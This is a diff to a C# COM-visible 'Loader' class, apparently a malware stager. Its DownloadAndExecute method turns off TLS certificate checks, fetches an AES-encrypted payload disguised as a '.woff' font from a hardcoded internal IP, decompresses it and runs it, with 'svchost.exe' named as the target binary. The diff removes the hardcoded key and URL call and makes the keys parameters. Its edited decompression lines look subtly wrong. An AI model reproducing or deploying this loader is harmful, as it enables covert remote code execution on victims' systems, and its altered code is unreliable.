@@ -30,15 +30,7 @@ using System.Text;
 [ComVisible(true)]
 public class Loader
 {
-    public Loader() 
-    {
-        byte[] AESKey = Encoding.ASCII.GetBytes("D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT");
-        byte[] AESIV = Encoding.ASCII.GetBytes("8y/B?E(G+KbPeShV");
-        this.DownloadAndExecute("https://192.168.8.205:8443/hello.woff", "svchost.exe", "", AESKey, AESIV);
-    }
-
-    private static string AESKey;
-    private static string AESIV;
+    public Loader() { }
 
     [StructLayout(LayoutKind.Sequential)]
     public class SecurityAttributes
@@ -148,8 +140,11 @@ public class Loader
         Process.Start(path);
     }
 
-    public void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, byte[] AESKey, byte[] AESIV)
+    public void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, string aeskey, string aesiv)
     {
+        byte[] AESKey = Encoding.ASCII.GetBytes(aeskey);
+        byte[] AESIV = Encoding.ASCII.GetBytes(aesiv);
+
         ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
         System.Net.WebClient client = new WebClientWithTimeout();
 
@@ -205,7 +200,7 @@ public class Loader
                 {
                     using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
                     {
-                        deflateStream.Write(decompressedArray, 0, decompressedArray.Length);
+                        deflateStream.Write(decompressedArray, 0, compressStream.ToArray().Length);
                     }
                 }
             }
@@ -219,7 +214,7 @@ public class Loader
                 {
                     using (GZipStream gzipStream = new GZipStream(compressStream, CompressionMode.Decompress))
                     {
-                        gzipStream.Write(decompressedArray, 0, decompressedArray.Length);
+                        gzipStream.Write(decompressedArray, 0, compressStream.ToArray().Length);
                     }
                 }
             }
